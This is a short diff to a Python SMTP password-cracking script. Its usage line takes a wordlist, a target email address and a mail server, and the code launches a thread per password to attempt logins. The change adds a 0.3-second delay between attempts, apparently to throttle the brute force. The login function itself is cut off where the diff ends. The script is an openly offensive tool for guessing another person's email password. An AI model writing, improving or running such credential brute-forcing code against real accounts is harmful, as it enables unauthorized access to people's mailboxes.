@@ -1,7 +1,7 @@
 #By s0ck37
 #Args: python3 smtpcracker.py wordlist.txt emailtocrack@domain.com smtp.example.server port
 
-import smtplib,sys,threading
+import smtplib,sys,threading,time
 from colorama import Fore,Style,Back
 from pyfiglet import Figlet
 
@@ -13,6 +13,7 @@ def main():
     for pwd in pwds:
         x = threading.Thread(target=try_login, args=(sys.argv[2],str(pwd).replace("\n","")))
         x.start()
+        time.sleep(0.3)
     dict.close()
 
 def try_login(usr,pwd):
